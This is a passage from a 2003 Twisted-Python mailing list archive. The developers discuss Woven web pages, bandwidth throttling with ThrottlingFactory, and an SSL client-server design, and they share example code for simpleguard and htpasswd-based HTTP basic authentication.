> references around in your application.  This might involve more typing, 
> but trying to "throw" objects to other parts of your application, using 
> the registry, the Componentized request, or the session makes it 
> dependent upon an execution context.  That context is often present, 
> but it's an undeclared requirement, so it can be a very surprising 
> impediment to using a particular kind of resource from some other code 
> that does a related but not identical thing.

-- 
 Twisted | Christopher Armstrong: International Man of Twistery
  Radix  |          Release Manager,  Twisted Project
---------+     http://twistedmatrix.com/users/radix.twistd/



From glyph at twistedmatrix.com  Fri Jul 18 21:39:55 2003
From: glyph at twistedmatrix.com (Glyph Lefkowitz)
Date: Fri, 18 Jul 2003 20:39:55 -0500
Subject: [Twisted-Python] Accessing app-wide data in Woven
In-Reply-To: <20030718210557.GG1149@radii>
Message-ID: <E66BDD72-B989-11D7-953B-000393C9700E@twistedmatrix.com>

On Friday, July 18, 2003, at 04:05 PM, Christopher Armstrong wrote:

> I'm pretty sure that there was a freak double-thinko by both glyph and
> dovonan here: s/resource/request/ for the marked instances:

Good catch.  Yes, indeed :)




From dp at twistedmatrix.com  Sat Jul 19 15:08:35 2003
From: dp at twistedmatrix.com (Donovan Preston)
Date: Sat, 19 Jul 2003 12:08:35 -0700
Subject: [Twisted-Python] Woven: access to submodels
In-Reply-To: <20030713022136.GB1862@titus.home.puzzling.org>
References: <20030713022136.GB1862@titus.home.puzzling.org>
Message-ID: <6577C938-BA1C-11D7-8547-000A95864FC4@twistedmatrix.com>

I apologize for not responding immediately.

On Saturday, July 12, 2003, at 7:21PM, Mary wrote:

> I'm trying to replicate the functionality of http://eyes.puzzling.org/
> (currently powered by a bunch of Python CGI scripts running on an 
> Apache
> webserver) in Woven.
>
> eyes.puzzling.org is a kind of a minimalist blog, with pages that list
> recent entries, the authors of the entries, and so on.

Cool! Have you seen Blog, in the twistedmatrix.com cvs? It is out of 
date and
needs work, but feel free to steal the code/take over the 
project/whatever.

<snip>

> For each author, I would like to generate a /author/AUTHORNAME/ page
> which lists their individual entries. I am trying to create these pages
> from AuthorsPage's getDynamicChild method. The idea is to pass the
> already constructed submodel -- a dictionary representing the 
> individual
> author -- to the IndividualPage object I will construct to represent 
> the
> individual author's page, rather than have IndividualPage make its own
> database query for that information.

That's good -- that sounds like a good design. There are no rules when 
it
comes to Woven architecture, but reusing your Model objects, and model
production logic, across multiple pages sounds like a good idea to me.

> At present, as you can see below, I'm using getSubmodel to retrieve
> the (dictionary) submodel associated with a particular author. However,
> this returns a twisted.web.woven.model.DeferredWrapper instance, rather
> than the dictionary itself. Should I make IndividualPage add callbacks
> to the DeferredWrapper, or am I missing something crucial about
> retrieving submodels or is this model more fundamentally incorrect?

As Moshe said in his reply, currently the URL traversal process is 
synchronous,
so if you need to wait on a Deferred to construct the next URL segment 
Resource
you're going to be doing a lot more work than you should have to. Woven 
attempts
to hide Deferreds from the programmer by pausing rendering and resuming 
it
when the Deferred fires. So, fortunately, things may be simpler than 
they seem.
You can just pass the DeferredWrapper as the Main Model to the next Page
instance you construct, and as long as you are going to be rendering 
that Page
next, Woven will just wait on it as it would any other Deferred.

from twisted.web.woven import page
from twisted.web.woven import model

from twisted.internet import defer
from twisted.internet import reactor


class DeferredProducer(model.MethodModel):
     def wmfactory_someDeferred(self, reqeuest):
         d = defer.Deferred()
         reactor.callLater(0.5, self.produce, d)
         return d

     def produce(self, d):
         d.callback( "Hello, here is some text" )

     def wmfactory_someNotDeferred(self, request):
         return "Hi there"


class MainPage(page.Page):
     template = """<html>
     <h3 model="someNotDeferred" view="Text">qawsf</h3>
     <span model="someDeferred" view="Text">qwensd</span>
</html>"""

     def getDynamicChild(self, name, request):
         return ChildPage(
                     self.model.getSubmodel(request, 'someDeferred'))


class ChildPage(page.Page):
     template = """<html>
     Hello! Our main model is a deferred, so the next node will have to 
wait
     <span model="." view="Text">ncxnz</span>
</html>"""


resource = MainPage(DeferredProducer())




From radix at twistedmatrix.com  Sat Jul 19 16:15:26 2003
From: radix at twistedmatrix.com (Christopher Armstrong)
Date: Sat, 19 Jul 2003 16:15:26 -0400
Subject: [Twisted-Python] Woven: access to submodels
In-Reply-To: <6577C938-BA1C-11D7-8547-000A95864FC4@twistedmatrix.com>
References: <20030713022136.GB1862@titus.home.puzzling.org> <6577C938-BA1C-11D7-8547-000A95864FC4@twistedmatrix.com>
Message-ID: <20030719201526.GA1274@radii>

On Sat, Jul 19, 2003 at 12:08:35PM -0700, Donovan Preston wrote:

> As Moshe said in his reply, currently the URL traversal process is
> synchronous, so if you need to wait on a Deferred to construct the
> next URL segment Resource you're going to be doing a lot more work
> than you should have to. 

However, there is (now) a twisted.web.util.DeferredResource. Any time
a Resource is expected of you, but all you have is a Deferred that
will eventually result in a Resource, you can wrap the Deferred up in
one of these babies, and it'll DTRT. It's not necessary most of the
time, but it can be extremely useful.

-- 
 Twisted | Christopher Armstrong: International Man of Twistery
  Radix  |          Release Manager,  Twisted Project
---------+     http://twistedmatrix.com/users/radix.twistd/



From dp at twistedmatrix.com  Sat Jul 19 18:24:38 2003
From: dp at twistedmatrix.com (Donovan Preston)
Date: Sat, 19 Jul 2003 15:24:38 -0700
Subject: [Twisted-Python] Woven: access to submodels
In-Reply-To: <20030719201526.GA1274@radii>
References: <20030713022136.GB1862@titus.home.puzzling.org> <6577C938-BA1C-11D7-8547-000A95864FC4@twistedmatrix.com> <20030719201526.GA1274@radii>
Message-ID: <C8D0F2DA-BA37-11D7-8547-000A95864FC4@twistedmatrix.com>

On Saturday, July 19, 2003, at 1:15PM, Christopher Armstrong wrote:

> On Sat, Jul 19, 2003 at 12:08:35PM -0700, Donovan Preston wrote:
>
>> As Moshe said in his reply, currently the URL traversal process is
>> synchronous, so if you need to wait on a Deferred to construct the
>> next URL segment Resource you're going to be doing a lot more work
>> than you should have to.
>
> However, there is (now) a twisted.web.util.DeferredResource. Any time
> a Resource is expected of you, but all you have is a Deferred that
> will eventually result in a Resource, you can wrap the Deferred up in
> one of these babies, and it'll DTRT. It's not necessary most of the
> time, but it can be extremely useful.

Thank you for moving that into util. However, it doesn't support 
chaining -- the thing that is returned will be rendered. So it's no 
different than what I suggested.

dp




From radix at twistedmatrix.com  Sat Jul 19 18:39:05 2003
From: radix at twistedmatrix.com (Christopher Armstrong)
Date: Sat, 19 Jul 2003 18:39:05 -0400
Subject: [Twisted-Python] Woven: access to submodels
In-Reply-To: <C8D0F2DA-BA37-11D7-8547-000A95864FC4@twistedmatrix.com>
References: <20030713022136.GB1862@titus.home.puzzling.org> <6577C938-BA1C-11D7-8547-000A95864FC4@twistedmatrix.com> <20030719201526.GA1274@radii> <C8D0F2DA-BA37-11D7-8547-000A95864FC4@twistedmatrix.com>
Message-ID: <20030719223905.GB1274@radii>

On Sat, Jul 19, 2003 at 03:24:38PM -0700, Donovan Preston wrote:
> 
> On Saturday, July 19, 2003, at 1:15PM, Christopher Armstrong wrote:
> 
> >On Sat, Jul 19, 2003 at 12:08:35PM -0700, Donovan Preston wrote:
> >
> >>As Moshe said in his reply, currently the URL traversal process is
> >>synchronous, so if you need to wait on a Deferred to construct the
> >>next URL segment Resource you're going to be doing a lot more work
> >>than you should have to.
> >
> >However, there is (now) a twisted.web.util.DeferredResource. Any time
> >a Resource is expected of you, but all you have is a Deferred that
> >will eventually result in a Resource, you can wrap the Deferred up in
> >one of these babies, and it'll DTRT. It's not necessary most of the
> >time, but it can be extremely useful.
> 
> Thank you for moving that into util. However, it doesn't support 
> chaining -- the thing that is returned will be rendered. So it's no 
> different than what I suggested.

Chaining? I don't understand. It can be getChilded, if that's what you
mean. Or do you mean a DeferredResource wrapping a Deferred wrapping a
DeferredResource wrapping a Deferred resulting in something else? I
don't see why that would be a problem, but I haven't tried it.

-- 
 Twisted | Christopher Armstrong: International Man of Twistery
  Radix  |          Release Manager,  Twisted Project
---------+     http://twistedmatrix.com/users/radix.twistd/



From dp at twistedmatrix.com  Sat Jul 19 18:56:18 2003
From: dp at twistedmatrix.com (Donovan Preston)
Date: Sat, 19 Jul 2003 15:56:18 -0700
Subject: [Twisted-Python] Woven: access to submodels
In-Reply-To: <20030719223905.GB1274@radii>
References: <20030713022136.GB1862@titus.home.puzzling.org> <6577C938-BA1C-11D7-8547-000A95864FC4@twistedmatrix.com> <20030719201526.GA1274@radii> <C8D0F2DA-BA37-11D7-8547-000A95864FC4@twistedmatrix.com> <20030719223905.GB1274@radii>
Message-ID: <353B0296-BA3C-11D7-8547-000A95864FC4@twistedmatrix.com>

On Saturday, July 19, 2003, at 3:39PM, Christopher Armstrong wrote:
>
> Chaining? I don't understand. It can be getChilded, if that's what you
> mean.

Awesome, it can! I couldn't possibly see how this would have worked, 
but it does!

Thanks :-)

dp




From joel.vennin at wanadoo.fr  Sat Jul 19 21:20:09 2003
From: joel.vennin at wanadoo.fr (=?iso-8859-1?q?Jo=EBl=20Vennin?=)
Date: Sun, 20 Jul 2003 03:20:09 +0200
Subject: [Twisted-Python] htp example and twisted CPU usage
Message-ID: <200307200320.16434.joel.vennin@wanadoo.fr>

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

Hello all,

        I'm making an application with twisted and i have some problem with 
it.

I need to be able to limit bandwidth for a group of connection. A group of
connection can be "incoming client" (client connect to the server) and/or
"outcoming client" (server connect to the client).

Another request is to limit the "global bandwidth" upload and download.

I've take a look at the htb module in twisted.protocols but i'm not convinced
about it.

About CPU usage, i've tryed the example shaper which use htb, and when i
download something twisted take all my cpu.

If someone can help me about my request and can explain me why shaper example
take lots of cpu ...

Thanks for your reply

Jol
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.2.2 (GNU/Linux)

iD8DBQE/Ge5QOzJ7itUoJpQRAsHNAJ0R0SkKHW/1rKTN+hOQJq13QXM2VQCfYA3y
5eMvLn5qhH3y69sGCd5LaPM=
=bw7I
-----END PGP SIGNATURE-----




From andrew-twisted at puzzling.org  Sun Jul 20 04:42:35 2003
From: andrew-twisted at puzzling.org (Andrew Bennetts)
Date: Sun, 20 Jul 2003 18:42:35 +1000
Subject: [Twisted-Python] htp example and twisted CPU usage
In-Reply-To: <200307200320.16434.joel.vennin@wanadoo.fr>
References: <200307200320.16434.joel.vennin@wanadoo.fr>
Message-ID: <20030720084235.GA10749@frobozz>

On Sun, Jul 20, 2003 at 03:20:09AM +0200, Jo?l Vennin wrote:
> -----BEGIN PGP SIGNED MESSAGE-----
> Hash: SHA1
> 
> Hello all,
> 
>         I'm making an application with twisted and i have some problem with 
> it.
> 
> I need to be able to limit bandwidth for a group of connection. A group of
> connection can be "incoming client" (client connect to the server) and/or
> "outcoming client" (server connect to the client).
> 
> Another request is to limit the "global bandwidth" upload and download.
> 
> I've take a look at the htb module in twisted.protocols but i'm not convinced
> about it.

Specifically, look at twisted.protocols.policies.  There's a
ThrottlingFactory in there that might help you.

-Andrew.




From joel.vennin at wanadoo.fr  Sun Jul 20 07:46:14 2003
From: joel.vennin at wanadoo.fr (=?iso-8859-1?q?Jo=EBl=20Vennin?=)
Date: Sun, 20 Jul 2003 13:46:14 +0200
Subject: [Twisted-Python] Throttling Factory Problem ...
Message-ID: <200307201346.17206.joel.vennin@wanadoo.fr>

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

Hello all, 

I'm making an example to limit bandwidth with ThrottlingFactory. I've a server 
and a client. Client and server make echo. So it's an infinite process. I've 
limited the bandwith to 1Ko/s.

The problem is that the client send a lot's of data  (more than the limited 
bandwidth) during a little time. The server get all the data (more than the 
limited bandwith) and after each wait a long of time before send/received 
something.


Maybe i miss something, can you help me.

Thank you, jol


client.py:
from twisted.protocols import policies
from twisted.internet import protocol, reactor

class SenderProtocol(protocol.Protocol):

    def connectionMade(self):
        self.transport.registerProducer (self, 1)
        self.sendSomething ()

    def pauseProducing(self):
        print "Sender Protocol make a Pause"

    def resumeProducing(self):
        print "Sender Protocol make a Resume"

    def stopProducing(self):
        pass

    def sendSomething (self):
        self.transport.write (500 * "c")

    def dataReceived(self, data):
        self.transport.write(data)

    
class Client(protocol.ClientFactory):

    protocol = SenderProtocol
    
client = Client()
tClient = policies.ThrottlingFactory(client, readLimit=1000)

#port = reactor.listenTCP (7000, tServer, interface="127.0.0.1")

port = reactor.connectTCP ("127.0.0.1", 7000, tClient)

reactor.run ()




server.py:
from twisted.protocols import policies
from twisted.internet import protocol, reactor

class EchoProtocol(protocol.Protocol):

    def connectionMade(self):
        self.transport.registerProducer (self, 1)
        
    def pauseProducing(self):
        print "Echo Protocol make a Pause"

    def resumeProducing(self):
        print "Echo Protocol make a Resume"

    def stopProducing(self):
        pass

    def dataReceived(self, data):
        self.transport.write(data)

    
class Server(protocol.ServerFactory):

    protocol = EchoProtocol
    

server = Server()
tServer = policies.ThrottlingFactory(server, writeLimit=1000, readLimit=1000)

port = reactor.listenTCP (7000, tServer, interface="127.0.0.1")
reactor.run ()

-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.2.2 (GNU/Linux)

iD8DBQE/GoEJOzJ7itUoJpQRAgHgAJ9uDoy6Rj13J4mNC1PUp/GbhDMoWACdGv5/
KO7Hj3TchnGjizz3tM5l9jw=
=swOH
-----END PGP SIGNATURE-----




From oisin at enginesofcreation.ie  Sun Jul 20 08:31:31 2003
From: oisin at enginesofcreation.ie (Oisin Mulvihill)
Date: Sun, 20 Jul 2003 13:31:31 +0100
Subject: [Twisted-Python] Re: help, my woven web app won't work on win32 but will on linux!
In-Reply-To: <3F17D99C.9000908@enginesofcreation.ie>
References: <3F17D99C.9000908@enginesofcreation.ie>
Message-ID: <3F1A8BA3.8030407@enginesofcreation.ie>

Hi,

Well I have had various comments that the code I attached
does not work at all. I tried it on my osx machine with the
twisted 1.0.6 and Twisted-1.0.7alpha2 and found my code
didn't work on windows and linux machines. My suse linux
machine has Twisted-1.0.5 and this is the only machine on
which my program works. I installed 1.0.5 on my osx machine
and low and behold my program works.

I decided to try the "Page in depth" example on which my code
is based to see if I could track the problem. The index.rpy contains
this example. This example does not now work in 1.0.6 and
1.0.7alpha.

When you run this example with 1.0.5 and you can click on the
"fred" or "bob" link you get the following urls and the example
works:

http://localhost:20808/fred
http://localhost:20808/bob

This is what the woven page in depth documentation says and
it works.

If you run this example with 1.0.6/7 you get "resource not found"
error. If however you go to the following url first

http://localhost:20808/index.rpy/

and then click on the "fred" or "bob" link, you get the follow urls
and the example works:

http://localhost:20808/index.rpy/fred/
http://localhost:20808/index.rpy/bob/

This is not what the documentation says should happen. This
appears to be a bug in the new twisted versions. Has something
changed, that means woven child page methods no longer work,
as they did in twisted 1.0.5.

Can someone please shed some light on this?

Thanks,

om




Oisin Mulvihill wrote:

> Hi,
>
> I've produced a small model of my program which hightlights
> the problem I'm having. Attached are two files main.py and
> index.rpy. To run the web app run main and make sure index.rpy
> is in the same directory. Then point your web browser to
> http://localhost:20808
>
> On linux I can click on the web buttons and the app works
> fine. One windows (I'm using win2k) I simply get
> "No Such Resource, File not found".
>
> The button press issues a post and this shows up as the url
> "http://localhost:20808/control?action=set_view&view=view1"
>
> When you look at the MyPage class in index.rpy I have a
> wchild_control method. This method is called on linux and
> I then process the request and take the required action.
>
> On windows the wchild_control method does not appear to be
> called at all and I don't know why.
>
> Can anyone shed any light on this problem?
>
> Thanks,
>
>
> om
>
> ------------------------------------------------------------------------
>
> import time import urlparse import twisted.web.server from 
> twisted.web.woven import view from twisted.web.woven import page from 
> twisted.web.woven import model from twisted.web.woven import input 
> from twisted.web.microdom import lmx from twisted.web.woven import 
> widgets from twisted.web.woven import controller from twisted.python 
> import components # # Set up the session I'll be using: # class 
> IPreferences(components.Interface): pass class 
> Preferences(components.Adapter): __implements__ = IPreferences 
> components.registerAdapter(Preferences, twisted.web.server.Session, 
> IPreferences) class MyModel(model.MethodModel): """ """ pass class 
> NavigationControlsDisplay(view.View): template = """
>
>  
>  
> """ class View1(view.View): """ """ template = """
>
> View One
>
> """ class View2(view.View): """ """ template = """
>
> View Two
>
> """ class MyPage(page.Page): """ """ template ="""
> """ def wvfactory_current_view(self, request, node, model): 
> print("cafemonitor.CafePage.wvfactory_current_view") prefs = 
> request.getSession(IPreferences) view = getattr(prefs, 
> 'current_view','live_view') print("Selecting view <%s>." % view) if 
> view == "view1": print("Returning View1.") return View1(model) elif 
> view == "view2": print("Returning View2.") return View2(model) else: 
> print("unknown view <%s>. Returning View1." % view) return 
> View1(model) def wchild_control(self, request): """This is a fake 
> /control subdirectory used to control a specific machine. request - 
> action: new, complete, void, restore. """ print("wchild_control - 
> request.args <%s>." % str(request.args)) action = 
> request.args.get("action", 0)[0] if action == "set_view": prefs = 
> request.getSession(IPreferences) view = request.args.get("view", 0)[0] 
> print("Setting new view from navigation menu selection <%s>." % view) 
> prefs.current_view = view else: print("unknown action <%s>." % action) 
> return self resource = MyPage(MyModel()) 
> resource.setSubviewFactory("navigation", NavigationControlsDisplay)
>
>------------------------------------------------------------------------
>
>#!/usr/bin/env python
>from twisted.internet import reactor
>from twisted.internet.app import Application
>from twisted.web import static, server, script
>
>def main():
>	"""Run the xml rpc server.
>	"""
>	app = Application("CafeMonitor")
>
>	root = static.File("./")
>	root.processors = {
>		'.rpy': script.ResourceScript,
>		}
>
>	app.listenTCP(
>		port=20808,
>		factory=server.Site(root),
>		interface="localhost"
>	)
>	print("Web Frontend - <%s:%s>." % ("localhost", "20808"))
>	app.run(0)
>	
>if __name__ == '__main__':
>	main()
>	
>  
>

-------------- next part --------------
An embedded and charset-unspecified text was scrubbed...
Name: main.py
Url: http://twistedmatrix.com/pipermail/twisted-python/attachments/20030720/844266e4/attachment.txt 
-------------- next part --------------
An embedded and charset-unspecified text was scrubbed...
Name: index.rpy
Url: http://twistedmatrix.com/pipermail/twisted-python/attachments/20030720/844266e4/attachment-0001.txt 

From exarkun at intarweb.us  Sun Jul 20 16:25:37 2003
From: exarkun at intarweb.us (Jp Calderone)
Date: Sun, 20 Jul 2003 16:25:37 -0400
Subject: [Twisted-Python] Throttling Factory Problem ...
In-Reply-To: <200307201346.17206.joel.vennin@wanadoo.fr>
References: <200307201346.17206.joel.vennin@wanadoo.fr>
Message-ID: <20030720202537.GA645@intarweb.us>

On Sun, Jul 20, 2003 at 01:46:14PM +0200, Jo?l Vennin wrote:
> -----BEGIN PGP SIGNED MESSAGE-----
> Hash: SHA1
> 
> Hello all, 
> 
> I'm making an example to limit bandwidth with ThrottlingFactory. I've a server 
> and a client. Client and server make echo. So it's an infinite process. I've 
> limited the bandwith to 1Ko/s.
> 
> The problem is that the client send a lot's of data  (more than the limited 
> bandwidth) during a little time. The server get all the data (more than the 
> limited bandwith) and after each wait a long of time before send/received 
> something.
> 
> 
> Maybe i miss something, can you help me.
> 

  You've not actually made your protocols *respect* the limits being imposed
on it -- they just print out a message and merrily continue on their way.

  One way to do this correctly would be to set a flag in pauseProducing();
when sendSomething() is called and the flag is set, data should be held in a
buffer instead of written to the transport; when resumeProducing() is
called, any data in the buffer should be written to the transport.

  A couple things I'd like to point out: you cannot limit the number of
bytes per unit time you receive this way; to do proper limiting of that, you
need a router sitting somewhere upstream of your connection.  Second, if you
want to foist throttling onto arbitrary protocols/applications, this may not
be the best way to go about it; an external "wrapper" program can be used to
throttle an application or group of applications, such as trickled, may be
easier.  Of course, if you want to force everyone everywhere to use the
throttled version, doing it in-process is probably the only way to go.

  Hope this helps,

  Jp

-- 
"If you find a neighbor in need, you're responsible for serving that
neighbor in need, you're responsible for loving a neighbor just like you'd
like to love yourself." -- George W. Bush, Sept. 16, 2002
-------------- next part --------------
A non-text attachment was scrubbed...
Name: not available
Type: application/pgp-signature
Size: 189 bytes
Desc: not available
Url : http://twistedmatrix.com/pipermail/twisted-python/attachments/20030720/1c09cca3/attachment.pgp 

From alienoid at is.lg.ua  Sun Jul 20 16:41:01 2003
From: alienoid at is.lg.ua (Ruslan Spivak)
Date: Sun, 20 Jul 2003 23:41:01 +0300
Subject: [Twisted-Python] client-server communication + ssl + wxpython: newbie question, help
 please
Message-ID: <3F1AFE5D.5050105@is.lg.ua>

Hello, twisted users!

I'm newbie to twisted and after reading documentation feel somewhat a 
little bit confused, don't know where to start.
Can you give an advice on the following:

I need to have a server and a GUI client(wxpython), which communicates 
using ssl.
Server:
    - it should take requests for establishing connection from a lot of 
GUI clients using ssl
    - the request for connection method will pass to server simple types 
(strings and dicts)
    - server will ask radius  server if such user exists, and if so then 
it writes some info to database(MySQL) and adds some rules to firewall. 
If such user doesn't exist in radius, then it raises exception to remote 
client or just return error code.
    - If client succeded in connection, then server should every 3 
minutes call method 'checkpoint' on client. If it doesn't receive 
response from client, it deletes rules from firewall and writes some 
info to database.

Client:
     - wxpython gui based client, that tries to connect to remote server 
using ssl(Connection means connecting to some port on the server, 
passing parameters to remote method 'connect' and if there is no 
exception or return code == 1, connection is successfull and message 
printed to happy user).
     - client contains method that will be periodically(each 3 minutes) 
called by server after successful connection

I just don't know where to start. Should client implement Root.pb as 
from Chapter 5(Perspective broker), so that it can pass reference to 
server and server can call methods on it or maybe i need implement some 
protocol? And how ssl fits in all this? Is it high-level or low-level 
twisted to impelemt features i've described?
Thanks in advance.
Your help is very, very appreciated.

Best regards,
Ruslan




From m at moshez.org  Sun Jul 20 16:39:27 2003
From: m at moshez.org (Moshe Zadka)
Date: 20 Jul 2003 20:39:27 -0000
Subject: [Twisted-Python] Guard
Message-ID: <20030720203927.14688.qmail@green.zadka.com>

As many of you know, using guard (the webby interface to authentication)
has been a thorny issue with Twisted. Christopher Armstrong and I wrote
a module which hides many of the details of using guard, and supplies
a much more usable interface.

So, here is an example of using twisted.web.woven.simpleguard:

from twisted.cred import checkers
from twisted.internet import reactor
from twisted.web import server, resource
from twisted.web.woven import simpleguard

class SimpleResource(resource.Resource):

    def getChild(self, path, request):
        return self

    def render(self, request):
        auth = request.getComponent(simpleguard.Authenticated)
        if auth:
            return "hello my friend "+auth.name
        else:
            return """
            I don't think we've met
            <a href="perspective-init">login</a>
            """

checker = checkers.InMemoryUsernamePasswordDatabaseDontUse()
checker.addUser("bob", "12345")
anon = checkers.AllowAnonymousAccess()

reactor.listenTCP(8889, server.Site(
      resource = simpleguard.guardResource(SimpleResource(), [checker, anon])))
reactor.run()

A simpler example would be using simpleguard to password-protect a
directory:

checker = checkers.OnDiskUsernamePasswordDatabase('/etc/www/htpasswd')
resource = static.File("/var/www/htdocs")
resource.putChild('secret',
    simpleguard.guardResource(static.File('/var/www/htdocs/secret'),
                              [checker])
reactor.listenTCP(8889, server.Site(resource))
reactor.run()

I hope these two examples show that using authentication in a web
application is easier than it used to be!

Thanks,
Moshe
-- 
Moshe Zadka -- http://moshez.org/
Buffy: I don't like you hanging out with someone that... short.
Riley: Yeah, a lot of young people nowadays are experimenting with shortness.
Agile Programming Language -- http://www.python.org/



From andrew-twisted at puzzling.org  Sun Jul 20 21:27:16 2003
From: andrew-twisted at puzzling.org (Andrew Bennetts)
Date: Mon, 21 Jul 2003 11:27:16 +1000
Subject: [Twisted-Python] htpasswd / HTTP basic auth example
In-Reply-To: <20030720203927.14688.qmail@green.zadka.com>
References: <20030720203927.14688.qmail@green.zadka.com>
Message-ID: <20030721012716.GG10749@frobozz>

On Sun, Jul 20, 2003 at 08:39:27PM -0000, Moshe Zadka wrote:
> As many of you know, using guard (the webby interface to authentication)
> has been a thorny issue with Twisted. Christopher Armstrong and I wrote
> a module which hides many of the details of using guard, and supplies
> a much more usable interface.

This reminds me -- I wrote a simple resource wrapper recently that provides
HTTP basic auth, reading from a htpasswd(1) file [currently it only supports
crypt'ed passwords, not MD5].  This doesn't use guard (or even newcred) at
all, although it probably should.

I keep meaning to post it to the list; so here it is!

---- htpasswdauth.py ----

from crypt import crypt

from twisted.web import static
from twisted.web.resource import Resource
from twisted.protocols import http

__all__ = ['HtPasswdWrapper']

class UnauthorizedResource(Resource):
    isLeaf = 1
    def __init__(self, realm, errorPage):
        Resource.__init__(self)
        self.realm = realm
        self.errorPage = errorPage

    def render(self, request):
        request.setResponseCode(http.UNAUTHORIZED)
        # FIXME: Does realm need to be quoted?
        request.setHeader('WWW-authenticate', 'basic realm="%s"' % self.realm)
        return self.errorPage.render(request)


class HtPasswdWrapper(Resource):
    """Apache-style htpasswd protection for a resource.

    Requires a client to authenticate (using HTTP basic auth) to access a
    resource.  If they fail to authenticate, or their username and password
    aren't accepted, they receive an error page.

    The username and password are checked against a htpasswd(1) file using
    crypt.  The file is re-read for every request.

    TODO:
        - Integrate this into twisted.web.woven.guard / newcred?
        - Support MD5 password hashes in the htpasswd file, as well as crypt.

    @cvar unauthorizedPage: L{Resource} that will be used to render the error
        page given when a user is unauthorized.
    """

    unauthorizedPage = static.Data(
        '<html><body>Access Denied.</body></html>', 'text/html'
    )

    def __init__(self, resource, htpasswdFilename, realm):
        """Constructor.
        
        @param resource: resource to protect with authentication.
        @param htpasswdFilename: filename of an htpasswd file to authenticate
            with.  Currently only crypt(3)-format passwords are supported.
        @param realm: HTTP auth realm.
        """
        Resource.__init__(self)
        self.resource = resource
        self.filename = htpasswdFilename
        self.realm = realm

    def getChildWithDefault(self, path, request):
        if self.authenticateUser(request):
            return self.resource.getChildWithDefault(path, request)
        else:
            return self.unauthorized()

    def render(self, request):
        if self.authenticateUser(request):
            return self.resource.render(request)
        else:
            return self.unauthorized().render(request)

    def authenticateUser(self, request):
        username, password = request.getUser(), request.getPassword()
        lines = [l.rstrip().split(':', 1) for l in file(self.filename).readlines()]
        lines = [l for l in lines if l[0] == username]
        if not lines:
            return 0
        hashedPassword = lines[0][1]
        return hashedPassword == crypt(password, hashedPassword[:2])

    def unauthorized(self):
        return UnauthorizedResource(self.realm, self.unauthorizedPage)


if __name__ == '__main__':
    # Quick & dirty testing...
    
    # create the intarweb
    from twisted.web.server import Site
    root = Resource()
    sit = Site(HtPasswdWrapper(root, '/tmp/htpasswdtest', 'test site'))
    #sit = Site(root)

    root.putChild('', static.Data('If you can see this, you are authorized!  Congrats!', 'text/plain'))
    root.putChild('blah', static.Data('Bring me a child!!', 'text/plain'))

    # and finally talk to the internat
    from twisted.internet import reactor
    reactor.listenTCP(18080, sit)
    reactor.run()

---- end ----

-Andrew.




From minh.luu at toll.com.au  Sun Jul 20 21:30:03 2003
From: minh.luu at toll.com.au (Minh Luu)
Date: Mon, 21 Jul 2003 11:30:03 +1000
Subject: [Twisted-Python] How to send message to all connected clients
Message-ID: <021b01c34f27$9c28e330$0202d90a@its09455>

Hi,

Could I have some advice on how to send a message to all connected clients.

Where do I keep the list of the client connections - in the sub-class of Protocol
or in the sub-class of Factory?

Do I call the write method for each client connection or there is a better way in twisted
to send a message to all the clients or a group of clients.

Thanks,
-------------- next part --------------
An HTML attachment was scrubbed...
URL: http://twistedmatrix.com/pipermail/twisted-python/attachments/20030721/8c11fd34/attachment.htm 

From exarkun at intarweb.us  Sun Jul 20 21:40:41 2003
From: exarkun at intarweb.us (Jp Calderone)
Date: Sun, 20 Jul 2003 21:40:41 -0400
Subject: [Twisted-Python] How to send message to all connected clients
In-Reply-To: <021b01c34f27$9c28e330$0202d90a@its09455>
References: <021b01c34f27$9c28e330$0202d90a@its09455>
Message-ID: <20030721014041.GA1654@intarweb.us>

On Mon, Jul 21, 2003 at 11:30:03AM +1000, Minh Luu wrote:
> Hi,
> 
> Could I have some advice on how to send a message to all connected clients.
> 
> Where do I keep the list of the client connections - in the sub-class of Protocol
> or in the sub-class of Factory?

  Definitely in your Factory subclass.  You can add Protocol instances to
the list in your buildProtocol() method and remove them either the Factory's
clientConnectionLost() method or the Protocol's connectionLost() method.

> 
> Do I call the write method for each client connection or there is a better way in twisted
> to send a message to all the clients or a group of clients.
> 

  If you're using TCP, doing a write() on each connection is pretty much a
requirement.  If you're using UDP, you might be able to manage something
better with multicast (but since you mentioned factories, I'm guessing
you're not using UDP).

  Hope this helps,

  Jp

-- 
Somewhere, something incredible is waiting to be known.
                -- Carl Sagan
-------------- next part --------------
A non-text attachment was scrubbed...
Name: not available
Type: application/pgp-signature
Size: 189 bytes
Desc: not available
Url : http://twistedmatrix.com/pipermail/twisted-python/attachments/20030720/29dc6e62/attachment.pgp 

From glyph at twistedmatrix.com  Mon Jul 21 04:47:27 2003
From: glyph at twistedmatrix.com (Glyph Lefkowitz)
Date: Mon, 21 Jul 2003 03:47:27 -0500
Subject: [Twisted-Python] Guard
In-Reply-To: <20030720203927.14688.qmail@green.zadka.com>
Message-ID: <F4EBD408-BB57-11D7-9652-000393C9700E@twistedmatrix.com>

On Sunday, July 20, 2003, at 03:39 PM, Moshe Zadka wrote:

> As many of you know, using guard (the webby interface to 
> authentication)
> has been a thorny issue with Twisted. Christopher Armstrong and I wrote
> a module which hides many of the details of using guard, and supplies
> a much more usable interface.

For the record, I think this code is awful, and I am sad that my lack 
of time for documentation has made something like this necessary.

What simpleguard lets you avoid is writing a domain abstraction outside 
of your web code.  While this may seem attractive, it is a parlor trick 
to reduce linecount in trivialized examples, not a sensible way to 
architect an application or even a middling-small site.

I would urge all Twisted users to please avoid simpleguard, as I would 
like to remove it in a future release of Twisted.  Paul Swartz and I 
are working on more detailed documentation of newcred, but until then 
there are the mailing list messages last month in the thread "lies, 
damn lies, and stable interfaces" to which I humbly refer you all.

However, if the community concensus is really that our users want 
something like this I won't take it out.  I will just think it's a pity 
that HTTP has come to dominate networked application architecture so 
universally.




From m at moshez.org  Mon Jul 21 05:19:15 2003
From: m at moshez.org (Moshe Zadka)
Date: 21 Jul 2003 09:19:15 -0000
Subject: [Twisted-Python] Guard
In-Reply-To: <F4EBD408-BB57-11D7-9652-000393C9700E@twistedmatrix.com>
References: <F4EBD408-BB57-11D7-9652-000393C9700E@twistedmatrix.com>
Message-ID: <20030721091915.7967.qmail@green.zadka.com>

On Mon, 21 Jul 2003, Glyph Lefkowitz <glyph at twistedmatrix.com> wrote:

> For the record, I think this code is awful, and I am sad that my lack 
